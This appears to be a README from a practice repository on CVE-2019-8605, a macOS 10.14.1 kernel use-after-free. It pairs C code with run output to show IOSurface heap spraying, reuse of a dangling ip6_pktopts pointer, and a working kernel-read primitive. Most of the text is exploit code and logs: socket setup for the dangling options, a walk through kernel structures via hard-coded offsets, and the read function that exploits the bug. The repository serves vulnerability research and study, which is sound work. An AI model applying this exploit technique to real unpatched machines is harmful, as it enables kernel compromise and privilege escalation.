# **IOSurface_kread_observe (CVE-2019-8605)**

## Environment

macOS 10.14.1 x86_64 ([net.siguza.hsp4.kext](https://github.com/Siguza/hsp4/tree/master) needed)

## Description

This is similar to the previously written dangling_kptr_reuse repository, but slightly different.

**This repository performs kernel reads using an IOSurface heap-spraying technique.
Here, we check whether dangling pointers are actually reused, and what data ends up stored in the dangling pointers.**

Previously, when we read the README in the parent folder of the repository, we examined how data for spraying IOSurface is created under the title [“Using OSUnserializeBinary Format for IOSurface Heap Spraying”](https://github.com/wh1te4ever/xnu_1day_practice/blob/main/CVE-2019-8605/README.md#using-osunserializebinary-format-for-iosurface-heap-spraying)

The data to be sprayed is loaded into the kernel by the `IOSurface_set_value` function.

To inspect the data loaded into the kernel, we initialize the IOSurface from user space and use the obtained mach_port to access the kernel kobject; from there we sequentially walk structure fields to reach the sprayed dictionary and then the OSArray.

If a dangling kernel pointer obtained from the socket_fd matches the address of an element in the sprayed OSArray, it means the dangling pointer was reused.

I wrote this to verify whether a pointer that I arbitrarily wrote the 8-byte kernel value `0xc0debabe13371338` to (via kwrite64) is read back by the `rk64_via_uaf` function that leverages the vulnerability, and to check whether the dangling pointer is actually reused among the sprayed kernel data.

```c
// obtain userdict from IOSurface
//Thanks @jmpews, https://gist.github.com/jmpews/01b520993a742f72714cd06e40793eed
uint64_t userdict_from_IOSurface(void) {
	uint64_t surfRoot = port_to_kobject(IOSurfaceRootUserClient);
	// INFO("surfRoot: 0x%llx\n", surfRoot);

	// p/x offsetof(IOSurfaceRootUserClient, IOSurfaceClientArray) = 0x118;
	uint64_t surfClients = kread64(surfRoot + 0x118);
	// INFO("surfClients: 0x%llx\n", surfClients);

	uint64_t surfClient = kread64(surfClients + sizeof(uint64_t) * IOSurface_id);
	// INFO("surfClient: 0x%llx\n", surfClient);

	// p/x offsetof(IOSurfaceClient, IOSurface) = 0x40;
	uint64_t surface = kread64(surfClient + 0x40);
	// INFO("surface: 0x%llx\n", surface);

	// p/x offsetof(IOSurface, UserspaceValueDictionary) = 0xd0
	uint64_t userspaceValueDicts = kread64(surface + 0xd0);

	if(userspaceValueDicts != 0) return userspaceValueDicts;

	return 0;
}

bool is_our_sprayed_OSArray(uint64_t osarray) {
	uint32_t osarray_count = kread32(osarray + 0x20);	// 0x20 = p/x offsetof(OSArray, count)
	uint32_t osarray_capacity = kread32(osarray + 0x24);	// 0x24 = p/x offsetof(OSArray, capacity)
	
	if(osarray_count != 256)	return false;

	for(int i = 0; i < 256; i++) {
		uint64_t osdata_in_osarray = OSArray_objectAtIndex(osarray, i);
		uint64_t kbuffer = OSData_buffer(osdata_in_osarray);
		if(kread64(kbuffer + offsetof(struct ip6_pktopts, ip6po_minmtu)) != 0x41424344) return false;

		//yes, it's our sprayed osarray!
		printf("our sprayed 192bytes OSArray[%d] = 0x%llx\n", i, kbuffer);

		for(int j = 0; j < sizeof(dangling_kptrs) / sizeof(uint64_t); j++) {
			if(kbuffer == dangling_kptrs[j]) {
				INFO("DANGLING KPTR REUSE DETECTED!!! OSArray[%d](0x%llx) == dangling_kptrs[%d](0x%llx)\n", i, kbuffer, j, dangling_kptrs[j]);
				khexdump(dangling_kptrs[j], 0xc0);
				break;
			}
		}
	}

	return true;
}

// second primitive: read 20 bytes from addr
void* read_20_via_uaf(uint64_t addr) {
    // create a bunch of sockets
    int sockets[128];
    for (int i = 0; i < 128; i++) {
        sockets[i] = get_socket_with_dangling_options();
		dangling_kptrs[i] = get_dangling_ip6_pktopts_kaddr(sockets[i]);
    }
 
	for (int i = 0; i < 128; i++) {
        INFO("dangling_kptr = 0x%llx; obtained from socket_fd=%d\n", dangling_kptrs[i], sockets[i]);
    }
...
	uint64_t userspaceValueDicts = userdict_from_IOSurface();
	INFO("userspaceValueDicts: 0x%llx\n", userspaceValueDicts);

	struct kOSDict *dict = kernel_fetch_dict(userspaceValueDicts);

	int sprayed_osarray_found_count = 0;
    for (int i = 0; i < dict->count; i++) {
		if(is_our_sprayed_OSArray(dict->items[i].value)) {
			INFO("sprayed OSArray from dict[%u]: 0x%llx\n\n", i, dict->items[i].value);
			sprayed_osarray_found_count++;
		}
  }
	INFO("sprayed_osarray_found_count = %d\n", sprayed_osarray_found_count);
... 
    return buf;
}
```

If you run the actual code in the repository, among the sprayed dictionaries the second one had OSArray[47] pointing to the dangling `inp->in6p_outputopts` address.

The dangling address is **0xffffff802c0d7280**.

At [**0xffffff802c0d7280 + 0x010**] there is an 8-byte kernel address that we wrote intentionally.

Because the 0x10 offset field belongs to the ip6po_pktinfo field of `struct ip6_pktopts`, we can read 20 bytes from that address using the `get_pktinfo` function.

```
ret: 0x0, hsp4: 0xb03
kext_name: com.apple.kec.corecrypto
kext_addr_slid: 0xffffff7f9dcc7000
get_kbase ret: 0, kbase: 0xffffff801ce00000, kslide: 0x1cc00000
[*] IOSurface_init success, IOSurface_id=0x3
[*] surfRoot: 0xffffff802c4280e0
[*] surfClients: 0xffffff802deb0000
[*] surfClient: 0xffffff802c092e60
[*] surface: 0xffffff802b4fbc00
[*] kptr = 0xffffff80b0dbb000 -> kread64: 0xc0debabe13371338
[*] dangling_kptr = 0xffffff802c0d7280; obtained from socket_fd=3
[*] dangling_kptr = 0xffffff802c0d7280; obtained from socket_fd=4
...
[*] spray_IOSurface_call_count: 1
[*] userspaceValueDicts: 0xffffff8029396680
[*] dict 0xffffff8029396680, items 0xffffff80290ca240, count 33, capacity 36
our sprayed 192bytes OSArray[0] = 0xffffff802c0d5b40
our sprayed 192bytes OSArray[1] = 0xffffff802c0d5180
...
[*] sprayed OSArray from dict[1]: 0xffffff80293966c0

our sprayed 192bytes OSArray[0] = 0xffffff802932c480
our sprayed 192bytes OSArray[1] = 0xffffff802bbe7640
our sprayed 192bytes OSArray[2] = 0xffffff802bbe7100
...
our sprayed 192bytes OSArray[47] = 0xffffff802c0d7280
[*] DANGLING KPTR REUSE DETECTED!!! OSArray[47](0xffffff802c0d7280) == dangling_kptrs[0](0xffffff802c0d7280)
=============================
[0xffffff802c0d7280+0x000] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
**[0xffffff802c0d7280+0x010] 00 B0 DB B0 80 FF FF FF**  00 00 00 00 00 00 00 00  |  ................ 
[0xffffff802c0d7280+0x020] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
[0xffffff802c0d7280+0x030] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
[0xffffff802c0d7280+0x040] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
[0xffffff802c0d7280+0x050] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
[0xffffff802c0d7280+0x060] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
[0xffffff802c0d7280+0x070] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
[0xffffff802c0d7280+0x080] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
[0xffffff802c0d7280+0x090] 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................ 
[0xffffff802c0d7280+0x0a0] 00 00 00 00 44 43 42 41  00 00 00 00 00 00 00 00  |  ....DCBA........ 
[0xffffff802c0d7280+0x0b0] 00 00 00 00 44 43 42 41  00 00 00 00 00 00 00 DE  |  ....DCBA........ 
=============================
our sprayed 192bytes OSArray[48] = 0xffffff802dc05600
...
our sprayed 192bytes OSArray[255] = 0xffffff802dc0c3c0
[*] sprayed OSArray from dict[2]: 0xffffff8029396a00

...
[*] sprayed OSArray from dict[32]: 0xffffff8029346f80

[*] sprayed_osarray_found_count = 32
[*] rk64_via_uaf(kptr) = 0xc0debabe13371338
```